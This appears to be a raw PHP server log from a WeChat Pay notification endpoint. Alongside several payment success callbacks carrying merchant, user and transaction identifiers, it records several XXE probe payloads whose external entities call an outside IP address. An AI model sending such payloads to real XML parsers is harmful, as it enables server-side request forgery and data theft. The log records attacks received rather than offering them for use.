03:14:48|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019092603_665?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:14:48|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019092603_665?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:26:12|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019092603_665?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:26:12|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019092603_665?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:35:37|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019092603_665?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:35:37|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019092603_665?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
10:46:49|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d8c268ec465f]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[212062280998209206301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[62B506C03CBC1EEC0B2A95DE460A3859]]></sign>
<time_end><![CDATA[20190926104648]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000411201909267149542891]]></transaction_id>
</xml>'
| GET:array (
)
10:46:49|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d8c268ec465f',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '212062280998209206301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '62B506C03CBC1EEC0B2A95DE460A3859',
  'time_end' => '20190926104648',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000411201909267149542891',
)
| GET:array (
)
16:56:22|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d8c7d2ff002a]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[259062283214924801301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[B1A1B5D19E86CD3F8E1394A6B3F969EF]]></sign>
<time_end><![CDATA[20190926165621]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000408201909263785097386]]></transaction_id>
</xml>'
| GET:array (
)
16:56:22|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d8c7d2ff002a',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '259062283214924801301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'B1A1B5D19E86CD3F8E1394A6B3F969EF',
  'time_end' => '20190926165621',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000408201909263785097386',
)
| GET:array (
)
